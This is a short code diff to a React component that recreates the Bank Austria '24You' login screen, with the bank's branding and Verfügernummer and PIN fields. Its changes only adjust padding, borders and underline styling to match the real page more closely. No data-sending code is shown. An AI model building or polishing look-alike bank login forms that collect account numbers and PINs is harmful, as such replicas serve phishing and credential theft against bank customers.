@@ -88,7 +88,7 @@ const BankAustria = () => {
         </header>
 
         {/* Main Content */}
-        <main className="flex-1 px-10 py-8" style={{ backgroundColor: "#fff" }}>
+        <main className="flex-1 px-10 pt-14 pb-8" style={{ backgroundColor: "#fff" }}>
           {/* 24You */}
           <div className="mb-6 text-center">
             <span className="text-4xl" style={{ color: "#e2001a", fontFamily: "'UniCreditMedium', sans-serif" }}>24You</span>
@@ -103,7 +103,7 @@ const BankAustria = () => {
                 onChange={(e) => setVerfueger(e.target.value)}
                 placeholder="Verfügernummer"
                 className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-                style={{ border: "2px solid #ccc" }}
+style={{ border: "1px solid #ccc" }}
               />
             </div>
 
@@ -114,7 +114,7 @@ const BankAustria = () => {
                 onChange={(e) => setPin(e.target.value)}
                 placeholder="PIN"
                 className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-                style={{ border: "2px solid #ccc" }}
+                style={{ border: "1px solid #ccc" }}
               />
             </div>
 
@@ -126,8 +126,8 @@ const BankAustria = () => {
                   color: "#00aed0",
                   textDecoration: "underline",
                   textDecorationColor: "black",
-                  textDecorationThickness: "2.5px",
-                  textUnderlineOffset: "3px",
+                  textDecorationThickness: "1.5px",
+                  textUnderlineOffset: "1px",
                 }}
               >
                 PIN vergessen oder Verfügernummer gesperrt?
